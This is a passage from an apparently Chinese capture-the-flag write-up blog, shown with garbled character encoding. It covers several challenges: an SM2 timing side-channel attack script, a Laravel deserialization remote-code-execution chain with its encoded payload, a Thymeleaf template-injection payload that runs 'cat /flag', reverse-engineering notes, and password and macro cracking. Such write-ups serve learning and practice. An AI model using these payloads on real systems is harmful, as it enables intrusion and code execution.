´çš„ç®—æ³•ï¼Œæˆ–è®¸ä¼šåœ¨å…¶ä»–åœ°æ–¹å‡ºç°é—®é¢˜ï¼Ÿ(å®¹å™¨ä¸‹å‘åï¼Œå¸ˆå‚…è‡ªè¡Œncå“¦ï½ï½ï½) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283#!/usr/bin/python3 from time import perf_counter_ns as clock1from time import *ecc_table = &#123; &#x27;n&#x27;: &#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;, &#x27;p&#x27;: &#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF&#x27;, &#x27;g&#x27;: &#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7&#x27; &#x27;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;, &#x27;a&#x27;: &#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC&#x27;, &#x27;b&#x27;: &#x27;28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93&#x27;, &#x27;O&#x27;: &#x27;0000000000000000000000000000000000000000000000000000000000000000&#x27; &#x27;0000000000000000000000000000000000000000000000000000000000000000&#x27;,&#125;class TSM2(object): def __init__(self, sk): self.ecc_table = ecc_table self.n = int(ecc_table[&#x27;n&#x27;], 16) self.para_len = len(ecc_table[&#x27;n&#x27;]) self.ecc_a3 = (int(ecc_table[&#x27;a&#x27;], base=16) + 3) % int(ecc_table[&#x27;p&#x27;], base=16) self.sk = sk self.pk = self.kg(self.sk, ecc_table[&#x27;g&#x27;]) def sign(self, data, K): e = data d = self.sk k = K P1 = self.kg(k, self.ecc_table[&#x27;g&#x27;]) x = int(P1[0:self.para_len], 16) R = ((e + x) % int(self.ecc_table[&#x27;n&#x27;], base=16)) if R == 0 or R + k == int(self.ecc_table[&#x27;n&#x27;], base=16): return None d_1 = pow( d+1, int(self.ecc_table[&#x27;n&#x27;], base=16) - 2, int(self.ecc_table[&#x27;n&#x27;], base=16)) S = (d_1*(k + R) - R) % int(self.ecc_table[&#x27;n&#x27;], base=16) if S == 0: return None else: return &#x27;%064x%064x&#x27; % (R, S) def verify(self, Sign, data): r = int(Sign[0:self.para_len], 16) s = int(Sign[self.para_len:2 * self.para_len], 16) e = int(data.hex(), 16) t = (r + s) % self.n if t == 0: return 0 P1 = self.kg(s, self.ecc_table[&#x27;g&#x27;]) P2 = self.kg(t, self.pk) if P1 == P2: P1 = &#x27;%s%s&#x27; % (P1, 1) P1 = self._double_point(P1) else: P1 = &#x27;%s%s&#x27; % (P1, 1) P1 = self._add_point(P1, P2) P1 = self._convert_jacb_to_nor(P1) x = int(P1[0:self.para_len], 16) return r == ((e + x) % self.n) def kg(self, k, Point): k=k%self.n if k == 0: return &#x27;0&#x27; * 128 Point = &#x27;%s%s&#x27; % (Point, &#x27;1&#x27;) mask_str = &#x27;8&#x27; for i in range(self.para_len - 1): mask_str += &#x27;0&#x27; mask = int(mask_str, 16) Temp = Point flag = False for n in range(self.para_len * 4): if flag: Temp = self._double_point(Temp) if (k &amp; mask) != 0: if flag: Temp = self._add_point(Temp, Point) else: flag = True Temp = Point k = k &lt;&lt; 1 return self._convert_jacb_to_nor(Temp) def _double_point(self, Point): t1=clock1() l = len(Point) len_2 = 2 * self.para_len if l &lt; self.para_len * 2: return None else: x1 = int(Point[0:self.para_len], 16) y1 = int(Point[self.para_len:len_2], 16) if l == len_2: z1 = 1 else: z1 = int(Point[len_2:], 16) T6 = (z1 * z1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T2 = (y1 * y1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (x1 + T6) % int(self.ecc_table[&#x27;p&#x27;], base=16) T4 = (x1 - T6) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T3 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (y1 * z1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T4 = (T2 * 8) % int(self.ecc_table[&#x27;p&#x27;], base=16) T5 = (x1 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T1 * 3) % int(self.ecc_table[&#x27;p&#x27;], base=16) T6 = (T6 * T6) % int(self.ecc_table[&#x27;p&#x27;], base=16) T6 = (self.ecc_a3 * T6) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T1 + T6) % int(self.ecc_table[&#x27;p&#x27;], base=16) z3 = (T3 + T3) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (T1 * T1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T2 = (T2 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) x3 = (T3 - T5) % int(self.ecc_table[&#x27;p&#x27;], base=16) if (T5 % 2) == 1: T4 = (T5 + ((T5 + int(self.ecc_table[&#x27;p&#x27;], base=16)) &gt;&gt; 1) - T3) % int( self.ecc_table[&#x27;p&#x27;], base=16) else: T4 = (T5 + (T5 &gt;&gt; 1) - T3) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T1 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) y3 = (T1 - T2) % int(self.ecc_table[&#x27;p&#x27;], base=16) form = &#x27;%%0%dx&#x27; % self.para_len form = form * 3 t2=clock1() if(t2-t1&lt;1e7): sleep(0.01-(((t2-t1))/1000000000.0)) return form % (x3, y3, z3) def _add_point(self, P1, P2): t1=clock1() if P1 == &#x27;0&#x27; * 128: return &#x27;%s%s&#x27; % (P2, &#x27;1&#x27;) if P2 == &#x27;0&#x27; * 128: return &#x27;%s%s&#x27; % (P1, &#x27;1&#x27;) len_2 = 2 * self.para_len l1 = len(P1) l2 = len(P2) if (l1 &lt; len_2) or (l2 &lt; len_2): return None else: X1 = int(P1[0:self.para_len], 16) Y1 = int(P1[self.para_len:len_2], 16) if l1 == len_2: Z1 = 1 else: Z1 = int(P1[len_2:], 16) x2 = int(P2[0:self.para_len], 16) y2 = int(P2[self.para_len:len_2], 16) T1 = (Z1 * Z1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T2 = (y2 * Z1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (x2 * T1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T1 * T2) % int(self.ecc_table[&#x27;p&#x27;], base=16) T2 = (T3 - X1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (T3 + X1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T4 = (T2 * T2) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T1 - Y1) % int(self.ecc_table[&#x27;p&#x27;], base=16) Z3 = (Z1 * T2) % int(self.ecc_table[&#x27;p&#x27;], base=16) T2 = (T2 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (T3 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) T5 = (T1 * T1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T4 = (X1 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) X3 = (T5 - T3) % int(self.ecc_table[&#x27;p&#x27;], base=16) T2 = (Y1 * T2) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (T4 - X3) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T1 * T3) % int(self.ecc_table[&#x27;p&#x27;], base=16) Y3 = (T1 - T2) % int(self.ecc_table[&#x27;p&#x27;], base=16) form = &#x27;%%0%dx&#x27; % self.para_len form = form * 3 t2=clock1() if(t2-t1&lt;1e8): sleep(0.1-(((t2-t1))/1000000000.0)) return form % (X3, Y3, Z3) def _convert_jacb_to_nor(self, Point): len_2 = 2 * self.para_len x = int(Point[0:self.para_len], 16) y = int(Point[self.para_len:len_2], 16) z = int(Point[len_2:], 16) z_inv = pow( z, int(self.ecc_table[&#x27;p&#x27;], base=16) - 2, int(self.ecc_table[&#x27;p&#x27;], base=16)) z_invSquar = (z_inv * z_inv) % int(self.ecc_table[&#x27;p&#x27;], base=16) z_invQube = (z_invSquar * z_inv) % int(self.ecc_table[&#x27;p&#x27;], base=16) x_new = (x * z_invSquar) % int(self.ecc_table[&#x27;p&#x27;], base=16) y_new = (y * z_invQube) % int(self.ecc_table[&#x27;p&#x27;], base=16) z_new = (z * z_inv) % int(self.ecc_table[&#x27;p&#x27;], base=16) if z_new == 1: form = &#x27;%%0%dx&#x27; % self.para_len form = form * 2 return form % (x_new, y_new) else: return None def add_point(self,P1,P2): if P1==P2: return self._double_point(P1) else : return self._convert_jacb_to_nor(self._add_point(P1,P2))import sys,osfrom random import *import socketserverimport signalimport stringclass Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b&#x27;&#x27; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) &lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): msg=msg.encode() try: if newline: msg += b&#x27;\\n&#x27; self.request.sendall(msg) except: pass def recv(self, prompt=b&#x27;[-] &#x27;): self.send(prompt, newline=False) return self._recvall() def handle(self): signal.alarm(3600) g=ecc_table[&quot;g&quot;] O=ecc_table[&quot;O&quot;] t=[randint(1,254) for i in range(8)] sk=sum([1&lt;&lt;i for i in t]) self.send(&quot;system reseting...&quot;) sm2 = TSM2(sk) self.send(&quot;done&quot;) self.send(&quot;the system is &quot;+str(sm2.pk)) for i in range(100): try: user=int(self.recv(&quot;plz give me your number:&quot;)) except: self.send(&quot;wrong, plz try again&quot;) continue t1=clock1() kG=sm2.kg(sk-user,g) t2=clock1() self.send(&quot;used &quot;+str((t2-t1)/1e9)+&quot; s&quot;) if kG==O: f=open(&quot;/flag&quot;) flag=f.read() self.send(flag) exit() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): passclass ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): passif __name__ == &quot;__main__&quot;: HOST, PORT = &#x27;0.0.0.0&#x27;,8000 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True print(HOST, PORT) server.serve_forever() TSM2 ç±»ä¸ºæ­£å¸¸SM2ç®—æ³•å®ç°ï¼Œåªä¸è¿‡åœ¨åŠ æ³•è¿ç®— _add_point() å’Œå€ä¹˜è¿ç®— _double_point() åˆ†åˆ«åŠ äº† sleep() æ§åˆ¶è¿ç®—æ—¶é—´ã€‚ handle() å¤„ç†å‡½æ•°é‡Œï¼Œç»™å‡ºå…¬é’¥ $pk$ï¼Œç»™100æ¬¡è¦æ±‚è¾“å…¥ $u$ï¼Œå½“æ»¡è¶³ $(sk-u)G=O$ æ—¶å¯æ‹¿flagã€‚ è¦æ»¡è¶³ $(sk-u)G=O$ï¼Œåªæœ‰ $sk-u=0$ æˆ– $sk-u=n$ï¼Œç”±äºé™¤äº†å…¬é’¥å’Œè¿ç®—æ€»æ—¶é—´æ— å…¶ä»–è¾“å‡ºï¼Œåªèƒ½çŒœæµ‹å‡º $u=sk$ã€‚ ç”±äº $sk$ åªæœ‰8ä½ä¸º1ï¼Œåˆ©ç”¨è¿ç®—æ€»æ—¶é—´ï¼Œå¯ä½œä¸ºä¾§ä¿¡é“ä¿¡æ¯æ¥æµ‹è¯• $sk$ å„ä½ä¸º1æ—¶çš„æ¶ˆè€—æ—¶é—´ï¼Œæµ‹è¯•å‘ç°å½“æ¥è¿‘æ­£ç¡®çš„â€œ1â€ä½æ—¶ï¼Œè¿ç®—æ€»æ—¶é—´ç›¸è¾ƒç›¸é‚»çš„ä¸¤ä½å°ï¼Œé‚£ä¹ˆå¯ä½¿ç”¨æ—¶é—´ä¾§ä¿¡é“æ”»å‡»æ¥æ±‚è§£ç§é’¥ $sk$ã€‚ å› å°è¯•çš„æ€»æ¬¡æ•°æœ€å¤šä¸º100æ¬¡ï¼Œé‡‡ç”¨åŒºé—´éå†æ³•ç¼©å°å°è¯•æ¬¡æ•°ï¼Œä»¤ $x$ ä¸ºæ¯ä¸ªåŒºé—´é•¿åº¦ï¼Œæ€»æ¬¡æ•° $c=\\cfrac{254}{x}+8x \\le 100$ï¼Œ$x$ å¯å–å€¼4~8ã€‚ é‡‡ç”¨ $x=4$ å®ç°ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *r=remote(&#x27;nep.lemonprefect.cn&#x27;,31135)r.recvuntil(&#x27;is &#x27;)pk=r.recvline().strip()print(pk)nowt = 100000.0start = []startt = []def send(x): r.recvuntil(&#x27;number:&#x27;) r.sendline(str(x)) r.recvuntil(&#x27;used &#x27;) time = float(r.recvuntil(&#x27; s&#x27;)[:-2]) r.recvline() return timefor i in range(1,255,4): t = send(1 &lt;&lt; i) print(i,t) if t &gt; nowt: start.append(i-4) print(start) nowt = t print(start)ans = []for k in start: nowt = send(1 &lt;&lt; k) for j in range(4): t = send(1 &lt;&lt; (k+1+j)) if t &gt; nowt and k+1+j-1 &lt;= 254: ans.append(k+1+j-1) print(ans) nowt = t print(ans)sk = sum([1&lt;&lt;i for i in ans])print(sk)send(sk)print(r.recvall()) â€‹ WEBJust Kidding é¡½çš®çš„HRPç”¨Laravelå†™äº†ä¸ªé¡¹ç›®æ¥æ¬¢è¿å¤§ä¼™æ¥ç©Nepctf 2ndï¼Œæ²¡æƒ³åˆ°â€¦å±…ç„¶è¢«åè›‹Sharunæ’…äº† è®¿é—® www.zip ä¸‹è½½æºç ï¼ŒCMSä¸ºLaravel 9.xã€‚ åœ¨ www\\app\\Http\\Controllers å‘ç° HelloController.phpï¼š 1234567891011&lt;?phpnamespace App\\Http\\Controllers;class HelloController extends Controller&#123; public function hello(\\Illuminate\\Http\\Request $request)&#123; $h3 = base64_decode($request-&gt;input(&quot;h3&quot;)); unserialize($h3); return &quot;Welcome Nepctf! GL&amp;HF&quot;; &#125;&#125; ååºåˆ—åŒ–RCEæ¼æ´ï¼Œä½¿ç”¨ç°æˆé“¾å­å¯ä»¥æ‰“é€šï¼š 12345678910111213141516171819202122232425&lt;?phpnamespace Illuminate\\Routing&#123; use Illuminate\\Validation\\Validator; class PendingResourceRegistration &#123; protected $registrar; protected $registered = false; protected $name=&#x27;call_user_func&#x27;; protected $controller=&#x27;system&#x27;; protected $options; public function __construct($cmd)&#123; $this-&gt;registrar=new Validator(); $this-&gt;options=$cmd; &#125; &#125; echo base64_encode(serialize(new PendingResourceRegistration(&#x27;cat /flag&#x27;)));&#125;namespace Illuminate\\Validation&#123; class Validator&#123; public $extensions = []; public function __construct()&#123; $this-&gt;extensions[&#x27;&#x27;]=&#x27;call_user_func&#x27;; &#125; &#125;&#125; Payloadï¼š /hello?h3=Tzo0NjoiSWxsdW1pbmF0ZVxSb3V0aW5nXFBlbmRpbmdSZXNvdXJjZVJlZ2lzdHJhdGlvbiI6NTp7czoxMjoiACoAcmVnaXN0cmFyIjtPOjMxOiJJbGx1bWluYXRlXFZhbGlkYXRpb25cVmFsaWRhdG9yIjoxOntzOjEwOiJleHRlbnNpb25zIjthOjE6e3M6MDoiIjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7fX1zOjEzOiIAKgByZWdpc3RlcmVkIjtiOjA7czo3OiIAKgBuYW1lIjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7czoxMzoiACoAY29udHJvbGxlciI7czo2OiJzeXN0ZW0iO3M6MTA6IgAqAG9wdGlvbnMiO3M6OToiY2F0IC9mbGFnIjt9 â€‹ Challenger é¡½çš®çš„HRPåˆæ¢äº†ç§è¯­è¨€å†™é¡¹ç›®æ¥æ¬¢è¿å¤§å®¶ï¼Œæ²¡æƒ³åˆ°åˆè®©Sharunæ˜äº†ğŸ˜­ ï¼ˆflagåœ¨æ ¹ç›®å½•ä¸‹: /flagï¼‰ ç”¨jd-guiåç¼–è¯‘ challenger.jar æ–‡ä»¶ï¼Œå‘ç°ä½¿ç”¨äº†Thymeleafæ¨¡æ¿ï¼Œ åœ¨ HelloController.class é‡Œå‘ç° /eval è·¯ç”±ï¼š 1234567891011121314@Controllerpublic class HelloController&#123; Logger log = LoggerFactory.getLogger(com.veracode.research.HelloController.class); @GetMapping(&#123;&quot;/&quot;&#125;) public String index(Model model) &#123; model.addAttribute(&quot;message&quot;, &quot;challenger&quot;); return &quot;welcome&quot;; &#125; @GetMapping(&#123;&quot;/eval&quot;&#125;) public String path(@RequestParam String lang) &#123; return &quot;user/&quot; + lang + &quot;/welcome&quot;; &#125;&#125; å‚è€ƒ Thymeleaf æ¨¡æ¿æ³¨å…¥å¯¼è‡´å‘½ä»¤æ‰§è¡Œï¼Œä¿®æ”¹payloadæ‹¿åˆ°flagï¼š Payload: /eval?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20/flag%22).getInputStream()).next()%7d__:: â€‹ REVERSEå¿«æ¥ç­¾åˆ° x86 linux è¶£å‘³é¢˜ã€‚ IDAæ‰“å¼€å‘ç°æŠ¥é”™ The graph is too big more than 1000 nodes...ï¼Œä¸” main() å‡½æ•°ä¸­å®šä¹‰å¤šä¸ªå›¾èŠ‚ç‚¹ï¼Œåˆ° IDA - Options - Graph - Max number of nodes é‡Œæ”¹ä¸€ä¸ªå¤§æ•°ä¿å­˜ï¼Œå›åˆ° main() å‡½æ•°åˆ‡æ¢æˆGraph overviewæˆ–è€…IDA Viewä¸­ç¼©å°ï¼Œå¯ä»¥çœ‹åˆ°æ§åˆ¶æµå›¾ï¼ˆCFGï¼‰ï¼š flagï¼šNepCTF&#123;welc0me_t0_nepctf&#125; â€‹ We_can_gone æ˜¯å‡ºå‘çš„æ—¶å€™äº†!!! Goé€†å‘ï¼ŒIDA7.7åˆ†æï¼Œåœ¨Stringçª—å£é‡Œæ‰¾åˆ°å…³é”®å­—ç¬¦ä¸²äº¤å‰å¼•ç”¨å®šä½å…¥å£å‡½æ•° sub_4994E0()ï¼š 123456789101112131415161718192021222324252627282930313233__int128 sub_4994E0()&#123; _BYTE *v0; // [esp+0h] [ebp-18h] int v1; // [esp+0h] [ebp-18h] unsigned int v2; // [esp+4h] [ebp-14h] int v3; // [esp+4h] [ebp-14h] int v4; // [esp+8h] [ebp-10h] unsigned int v5; // [esp+Ch] [ebp-Ch] _BYTE *v6; // [esp+14h] [ebp-4h] __int128 result; // [esp+1Ch] [ebp+4h] sub_4993B0(); // è¾“å‡ºå­—ç¬¦ä¸²&quot;Welcome to NepCTF,I gone on the other side&quot; v6 = v0; v5 = v2; sub_433950(); runtime_printstring(&quot;please input flag to help you get to the other side:\\n&quot;, 53); sub_4339C0(); if ( v5 &lt;= 0xB ) sub_459750(v1, v3); v6[11] = 84; if ( v5 &lt;= 0xC ) sub_459750(v1, v3); v6[12] = 82; if ( v5 &lt;= 0xD ) sub_459750(v1, v3); v6[13] = 85; if ( v5 &lt;= 0xE ) sub_459750(v1, v3); v6[14] = 69; // å®šä¹‰å­—ç¬¦ä¸²TRUE *(_QWORD *)&amp;result = __PAIR64__(v5, (unsigned int)v6); // ä¼ªä»£ç æ··ä¹± DWORD2(result) = v4; return result;&#125; ååŠéƒ¨åˆ†ä¼ªä»£ç ä¸æ¸…æ™°ï¼Œåœ¨è¯¥å‡½æ•°é™„è¿‘å‘ç°åˆ¤æ–­é€»è¾‘å‡½æ•° sub_499630() ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758void sub_499630()&#123; int i; // edx int v1; // [esp+0h] [ebp-64h] int *v2; // [esp+4h] [ebp-60h] int v3; // [esp+4h] [ebp-60h] _BYTE *v4; // [esp+Ch] [ebp-58h] int v5; // [esp+10h] [ebp-54h] int v6[8]; // [esp+20h] [ebp-44h] BYREF int *v7; // [esp+40h] [ebp-24h] int v8[2]; // [esp+44h] [ebp-20h] BYREF int v9[2]; // [esp+4Ch] [ebp-18h] BYREF int v10[2]; // [esp+54h] [ebp-10h] BYREF int v11[2]; // [esp+5Ch] [ebp-8h] BYREF v2 = (int *)unknown_libname_8((int)&quot;\\b&quot;); v7 = v2; v2[1] = 0; *v2 = 0; v11[0] = (int)&amp;unk_4A00A0; v11[1] = (int)v2; fmt_Fscanln((int)&amp;off_4D25B8, dword_54B200, (int)v11, 1, 1); v4 = (_BYTE *)sub_4479B0((int)v6, *v7, v7[1]); if ( v5 == 23 //è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦æ»¡è¶³23 &amp;&amp; *v4 == &#x27;N&#x27; &amp;&amp; v4[1] == &#x27;e&#x27; &amp;&amp; v4[2] == &#x27;p&#x27; &amp;&amp; v4[3] == &#x27;C&#x27; &amp;&amp; v4[4] == &#x27;T&#x27; &amp;&amp; v4[5] == &#x27;F&#x27; &amp;&amp; v4[6] == &#x27;&#123;&#x27; &amp;&amp; v4[22] == &#x27;&#125;&#x27; ) //è¾“å…¥å­—ç¬¦ä¸²æ»¡è¶³å‰ç¼€NepCTF&#123;ï¼Œåç¼€æ»¡è¶³&#125; &#123; for ( i = 0; i &lt; 15; ++i ) &#123; if ( i &gt;= (unsigned int)dword_54B6E4 ) sub_459750(v1, v3); if ( (unsigned int)(i + 7) &gt;= 0x17 ) sub_459750(v1, v3); if ( v4[i + 7] != *(_BYTE *)(dword_54B6E0 + i) ) //å°†è¾“å…¥å’Œdword_54B6E0æ¯”è¾ƒ &#123; v9[0] = (int)&quot;\\b&quot;; v9[1] = (int)&amp;off_4D2334; unknown_libname_61((int)&amp;off_4D25CC, dword_54B204, (int)v9, 1, 1); return; &#125; &#125; v8[0] = (int)&quot;\\b&quot;; v8[1] = (int)&amp;off_4D233C; unknown_libname_61((int)&amp;off_4D25CC, dword_54B204, (int)v8, 1, 1); &#125; else &#123; v10[0] = (int)&quot;\\b&quot;; v10[1] = (int)&amp;off_4D2334; unknown_libname_61((int)&amp;off_4D25CC, dword_54B204, (int)v10, 1, 1); &#125;&#125; åœ¨ v4[i + 7] != *(_BYTE *)(dword_54B6E0 + i) æ¯”è¾ƒå¤„ä¸‹æ–­ç‚¹åŠ¨è°ƒï¼ŒæŸ¥çœ‹ dword_54B6E0 å­˜æ”¾çš„å€¼ä¸º U9eT_t0_th3TRUEï¼Œæ•…flagä¸ºNepCTF&#123;U9eT_t0_th3TRUE&#125;ã€‚ â€‹ PWNèœã€‚","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022èµ›","slug":"2022èµ›","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"jsæ··æ·†","slug":"reverse-jsæ··æ·†","date":"2022-06-03T14:38:36.000Z","updated":"2023-06-03T14:51:17.064Z","comments":true,"path":"2022/06/03/reverse-jsæ··æ·†/","permalink":"https://lazzzaro.github.io/2022/06/03/reverse-js%E6%B7%B7%E6%B7%86/","excerpt":"","text":"â€‹ obfuscator / obæ··æ·†åï¼Œå˜é‡è·Ÿæ–¹æ³•åå·²ç»å®Œå…¨æ›¿æ¢ï¼Œç¬¬ä¸€è¡Œå¯ä»¥çœ‹åˆ°æ˜æ˜¾çš„ä¸€ä¸ªæ•°ç»„ã€‚ ç‰¹å¾ï¼šç§»ä½æ“ä½œï¼Œå‡½æ•°åå’Œå˜é‡åé€šå¸¸ä»¥ _0x æˆ–è€… 0x å¼€å¤´ï¼Œåæ¥ 1~6 ä½æ•°å­—æˆ–å­—æ¯ç»„åˆã€‚ è§£æ··æ·†ï¼š https://tool.yuanrenxue.cn/decode_obfuscator â€‹ packedç‰¹å¾ï¼ševalåé¢çš„functionå‚æ•°ç±»ä¼¼packedç»„æˆï¼ˆä¹Ÿå¯èƒ½æ˜¯å…¶ä»–ç»„æˆï¼‰ã€‚ è§£æ··æ·†ï¼š https://lelinhtinh.github.io/de4js/","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"js","slug":"js","permalink":"https://lazzzaro.github.io/tags/js/"},{"name":"æ··æ·†","slug":"æ··æ·†","permalink":"https://lazzzaro.github.io/tags/%E6%B7%B7%E6%B7%86/"}],"author":"Lazzaro"},{"title":"Dest0g3 520è¿æ–°èµ›","slug":"match-Dest0g3-520è¿æ–°èµ›","date":"2022-05-26T12:09:18.000Z","updated":"2022-05-28T14:17:41.878Z","comments":true,"path":"2022/05/26/match-Dest0g3-520è¿æ–°èµ›/","permalink":"https://lazzzaro.github.io/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/","excerpt":"","text":"â€‹ é¦–å±ŠDest0g3 520è¿æ–°èµ›æ›´åŠ æ³¨é‡CTFerçš„åŸºç¡€çŸ¥è¯†é¢æŒæ¡ç¨‹åº¦ï¼Œç”±æ˜“åˆ°éš¾ï¼Œé€‚åˆå„å­¦ä¹ é˜¶æ®µé€‰æ‰‹å‚åŠ ï¼Œçº¯èŒæ–°æ°´å‡†ã€‚ æ¯”èµ›æ—¶é—´ï¼š2022.5.20 10:00 - 5.27 10:00 é¢˜ç›®åˆ†ç±»ï¼šWebã€Pwnã€Miscã€Cryptoã€Reã€AIã€BlockChain é¢˜ç›®éš¾åº¦ï¼šèŒæ–° æ¯”èµ›ç±»å‹ï¼šä¸ªäººèµ› æ¯”èµ›äº¤æµQQç¾¤ï¼š923945203 ä¸ªäººèµ›å¥–åŠ±ï¼šæ€»æ¦œå‰10åŠå„æ–¹å‘å‰ä¸‰å‡å¯è·å¾—ã€Šä»0åˆ°1ï¼šCTFeræˆé•¿ä¹‹è·¯ã€‹ä¸€æœ¬ + å®šåˆ¶Uç›˜ï¼ˆ32Gï¼‰ä¸€ä¸ª Rank: 12 MISCWelcome to fxxking å…³æ³¨å…¬ä¼—å·å¹¶å›å¤ï¼šGive me the fxxking flag å…¬ä¼—å· Dest0g3 Team å›å¤ï¼šGive me the fxxking flagï¼Œ å¾—åˆ° The fxxking flag is: Dest0g3&#123;W31c0m3_t0_DestCTF2022!&#125; â€‹ Pngeniusforemoståˆ†è§£pngå›¾ç‰‡å¾—åˆ°zipå‹ç¼©åŒ…ï¼ŒzstegæŸ¥çœ‹pngå›¾ç‰‡çš„lsbé€šé“å¾—åˆ° Password for zip:Weak_Pas5w0rdï¼› ç”¨å¯†ç  Weak_Pas5w0rd è§£å‹zipå‹ç¼©åŒ…å¾—åˆ°flagï¼šDest0g3&#123;2908C1AA-B2C1-B8E6-89D1-21B97D778603&#125;ã€‚ â€‹ EasyEncode Enjoy Decoding ç”¨ARCHPRçˆ†ç ´zipå‹ç¼©åŒ…å¯†ç å¾—åˆ° 100861ï¼ŒæŒ‰ç…§ æ‘©æ–¯å¯†ç -16è¿›åˆ¶-Unicode-Base64 è§£ç å¾—åˆ° Dest0g3&#123;Deoding_1s_e4sy_4_U&#125;ã€‚ â€‹ ä½ çŸ¥é“jså—æ‰“å¼€flagæ–‡ä»¶å‘ç°æ˜¯wordæ–‡ä»¶/å‹ç¼©åŒ…ï¼Œåœ¨ document.xml ä¸­æ‰¾åˆ°Base64ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œè§£ç å¾—åˆ°brainfuckï¼Œåœ¨çº¿è§£å¯†å¾—åˆ°16è¿›åˆ¶å­—ç¬¦ä¸² 446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327Dï¼Œè½¬ä¸ºå­—ç¬¦å¾— Dest0g3&#123;86facac9-0a5d-4047-b702-86cb37ab77b2&#125;ã€‚ â€‹ StrangeTrafficWiresharkæ‰“å¼€å‘ç°æ˜¯Modbusæµé‡ï¼Œåœ¨æµ0å‘ç°åˆ†æ®µBase64å­—ç¬¦ä¸² RGVzdDBnM3ã€szMUE1QkVBã€Ni1GMjBELUã€YxOEEtRThFã€QS0yOUI0Rjã€I1NzEwOEJ9ï¼Œè¿æ¥è§£ç å¾— Dest0g3&#123;31A5BEA6-F20D-F18A-E8EA-29B4F257108B&#125;ã€‚ â€‹ EasyWord Let the word tell u æ ¹æ® hint.txt å¾—çŸ¥ password.docm å¯†ç å…¨å°å†™å­—æ¯ï¼Œä¸”æ»¡è¶³ ??q?b?ï¼Œç”¨johnçˆ†ç ´ï¼š 12office2john password.docm &gt; hash.txtjohn --mask=&#x27;?l?lq?lb?l&#x27; hash.txt å¾—åˆ°å¯†ç  ulqsbtï¼› æ‰“å¼€å‘ç°å­˜åœ¨å®ï¼ŒæŸ¥çœ‹å®ä»£ç æœ‰å¯†ç ï¼Œå‚è€ƒç±»ä¼¼é¢˜ç›®ä¸­ç ´è§£å®å¯†ç çš„æ–¹æ³•ï¼Œå°†wordæ–‡ä»¶ç”¨å‹ç¼©åŒ…æ–¹å¼æ‰“å¼€ï¼Œæ‰¾åˆ° vbaProject.bin æ–‡ä»¶ä»¥16è¿›åˆ¶æ–¹å¼æŸ¥çœ‹ï¼Œå°† DBP æ”¹ä¸º DBX å¹¶ä¿å­˜ï¼Œå†å°†ä¿®æ”¹åçš„æ–‡ä»¶æ›¿æ¢åˆ°å‹ç¼©åŒ…é‡Œï¼Œæ”¹å›wordæ–‡ä»¶æ ¼å¼ï¼Œé‡æ–°æ‰“å¼€å¯çœ‹åˆ°å®ä»£ç ã€‚ è¿›å…¥VBAç¼–è¾‘å™¨æŸ¥çœ‹Dialogå¯¹åº”å®ä»£ç ï¼š 